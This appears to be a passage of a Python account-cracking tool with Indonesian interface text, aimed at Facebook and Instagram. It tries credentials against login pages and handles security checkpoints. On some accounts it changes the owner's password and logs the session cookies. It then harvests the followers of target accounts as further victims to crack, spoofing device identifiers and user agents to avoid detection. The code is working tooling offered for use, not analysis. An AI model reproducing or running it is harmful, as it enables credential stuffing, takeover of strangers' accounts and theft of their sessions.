	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s• akun terkunci sesi new"%(M))
		else:
			print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s%s terdapat %s%s%s opsi %s:"%(U,til,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s akun one tab, sandi berhasil di ubah \n *--> %s ◊ %s ◊ %s			"%(H,til,user,pwbaru[0],coki))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s%s akun one tab, silahkan anda login		"%(H,til))
					os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s• akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s terjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s• akun tidak checkpoint, silahkan anda login "%(H))
				os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s• %s"%(M,oh))
	else:
		print("%s%s login gagal, silahkan cek kembali id dan kata sandi"%(M,til))
		
#HAPUS HASIL
def hapus_hasil():
	os.system('rm -rf CP/*.txt && OK/*.txt')
	os.system('rm -rf IG/*.txt')
	print ('');jeda(2)
	jalan (H+' √ berhasil menghapus hasil crack ');jeda(2)
	pilihan().menu()
	
# CEK HASIL
def hasill():
	print ("\n%s%s%s 01 %sCek hasil akun %sOK "%(U,til,P,O,H))
	print ("%s%s%s 02 %sCek hasil akun %sCP "%(U,til,P,O,K))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	
def cek_cek(rom):
	if rom in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
	elif rom in['1','01']:
		hasil_fb()
	elif rom in['2','02']:
		hasil_igehh()
	elif rom in['03','3']:
		hapus_hasil()
	elif rom in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
# CEK HASIL FACEBOOK
def hasil_fb():
	hasill()
	l = input('\n%s#%s Pilih %s> %s '%(P,O,M,K))
	if l in['']:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		menu()
	elif l in['1','01']:
		dirs = os.listdir('OK')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,H,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,H));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal %s: %s%s"%(U,O,M,H,file_nm,O,M,H,len(totalok)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,H));jeda(2)
		os.system('cat OK/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['2','02']:
		dirs = os.listdir('CP')
		print ("\n%s•%s [%s hasil crack yang tersimpan %s]\n"%(U,O,U,O))
		for file in dirs:
			print("%s•%s> %s%s"%(U,M,K,file));jeda(0.07)
		try:
			file = input("\n%s•%s masukan file %s:%s "%(U,O,M,K));jeda(0.2)
			if file in['']:
				exit("%s• isi yang benar kentod"%(M))
			totalcp = open('CP/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(M,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		jalan("%s•%s hasil tanggal%s : %s%s %stotal%s : %s%s"%(U,O,M,K,file_nm,O,M,K,len(totalcp)))
		print(" %s# %s---------------------------------------- %s#%s"%(P,M,P,K));jeda(2)
		os.system('cat CP/%s'%(file))
		print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
		exit('\n')
	elif l in['0','00']:
		pilihan().menu()
	else:
		print ('\n%s%s isi yang benar'%(M,til));jeda(2)
		pilihan().menu()
		
# CEK HASIL IGEH
def hasil_igehh():
	print('')
	for i in os.listdir('IG'):
		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
	try:
		c=input("\n%s•%s masukan file %s:%s "%(U,O,M,K))
		if c in['']:
			exit("\n%s• isi yang benar kentod"%(M))
		g=open("IG/%s"%(c)).read().splitlines()
	except FileNotFoundError:
		exit("\n%s• file tidak tersedia"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s---------------------------------------- %s#"%(P,M,P));jeda(2)
	for s in g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
		fol=s.split("|")[2]
		ful=s.split("|")[3]
		if xc=="CP":
			print(f"""{J}╔══[ {K}Checkpoint                      
{J}║══[ {K}Username  {M}> {K}{usr}{C}
{J}║══[ {K}Password  {M}> {K}{pwd}{C}
{J}║══[ {K}Followers {M}> {K}{fol}{C}
{J}╚══[ {K}Following {M}> {K}{ful}{C}
			""");jeda(0.05)
		else:
			print(f"""{J}╔══[ {H}Berhasil                      
{J}║══[ {H}Username  {M}> {H}{usr}{C}
{J}║══[ {H}Password  {M}> {H}{pwd}{C}
{J}║══[ {H}Followers {M}> {H}{fol}{C}
{J}╚══[ {H}Following {M}> {H}{ful}{C}
			""");jeda(0.05)

#----------------------------------------------#
#---{ CRACK INSTAGRAM }---#
#---------------------------------------------#
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"

internal=[]
external=[]
success=[]
checkpoint=[]
loop=0
following=[]
s=requests.Session()

try:
    # python 2
	urllib_quote_plus = urllib.quote
except:
    # python 3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
	user=open('.username','r').read()
	try:
		c=requests.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN})
		i=c.json()["graphql"]["user"]
		nama=i["full_name"]
		followers=i["edge_followed_by"]["count"]
		following=i["edge_follow"]["count"]
		external.append(f'{nama}|{followers}|{following}')
	except ValueError:
		print(f'{M} ! Instagram Checkpoint');jeda(4)
		os.remove('.kukis.log')
		os.remove('.username')
		exit()
	return external,user

def checkin():
	try:
		kuki=open('.kukis.log','r').read()
	except FileNotFoundError:
		ado()
	ex,user=cekAPI(kuki)
	cookie={'cookie':kuki}
	instagram(ex,user,cookie).menu()

def ado():
	global external
	try:
		os.system('clear')
		catet_req = ('# Login dengan akun instagram anda dan pastikan akun bersifat publik. Jika login checkpoint wajib gunakan akun baru, buat akun baru lewat browser chrome')
		requ = rich.markdown.Markdown(catet_req, style='green')
		rich.console.Console().print(requ)
		us=input('%s%s %susername%s > %s'%(U,til,O,M,K))
		pw=stdiomask.getpass(prompt='%s%s %spassword%s > %s'%(U,til,O,M,K))
	except KeyboardInterrupt:
		exit('%s ! Terhenti '%(M))
		
	x=instagramAPI(us,pw).loginAPI()
	if x.get('status')=='success':
		open('.username','a').write(us)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print ('\n%s%s Login berhasil √'%(H,til));jeda(2)
		checkin()
	elif x.get('status')=='checkpoint':
		exit ('\n%s%s Akun terkena sesi '%(M,til));jeda(2)
	else:
		exit ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)

def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def user_agent():
	resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = random.choice(versions)
	dpi = random.choice(dpis)
	res = random.choice(resolutions)
	return (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		random.randint(1, 2),
		random.randint(0, 2),
		random.randint(10, 11),
		random.randint(1, 3),
		random.randint(3, 5),
		random.randint(0, 5),
		dpi,
		res,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	DEVICES = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(list(DEVICES.keys()))
	app_version = DEVICES[DEFAULT_DEVICE]['app_version']
	android_version = DEVICES[DEFAULT_DEVICE]['android_version']
	android_release = DEVICES[DEFAULT_DEVICE]['android_release']
	dpi = DEVICES[DEFAULT_DEVICE]['dpi']
	resolution = DEVICES[DEFAULT_DEVICE]['resolution']
	manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer']
	device = DEVICES[DEFAULT_DEVICE]['device']
	model = DEVICES[DEFAULT_DEVICE]['model']
	cpu = DEVICES[DEFAULT_DEVICE]['cpu']
	version_code = DEVICES[DEFAULT_DEVICE]['version_code']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})"
	return USER_AGENT_BASE

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['full_name']
			#pn=x_jason['logged_in_user']['phone_number']
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()

	def logo(self):
		os.system('clear')
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
		banner()
		print(f"""
{U}•{P} 01 {O}Crack dari pengikut
{U}•{P} 02 {O}Crack dari mengikuti
{U}•{P} 03 {O}Crack dari pencarian nama
{U}•{P} 04 {O}Crack secara target 
{U}•{P} 05 {O}Cek status akun hasil crack
{U}•{P} 06 {O}Bot auto unfollow
{U}•{P} rm {O}Hapus akun
{U}•{M} 00 {O}Keluar
	""")
	
	def menu(self):
		self.logo()
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		if c=='':
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif c in ('1','01'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
